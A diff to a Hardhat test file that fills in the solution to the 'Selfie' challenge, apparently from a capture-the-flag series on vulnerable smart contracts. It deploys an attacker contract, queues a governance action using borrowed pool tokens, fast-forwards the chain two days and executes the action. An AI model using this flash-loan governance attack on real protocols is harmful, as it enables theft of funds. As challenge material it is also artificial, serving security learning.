@@ -39,6 +39,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackerContract = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(
+            pool.address, 
+            governance.address, 
+            token.address);
+
+        await attackerContract.connect(player).attack(TOKENS_IN_POOL);
+        const actionId = await attackerContract.connect(player).actionId();
+        expect(actionId).to.be.equal(1);
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+
+        await governance.connect(player).executeAction(actionId);
     });
 
     after(async function () {
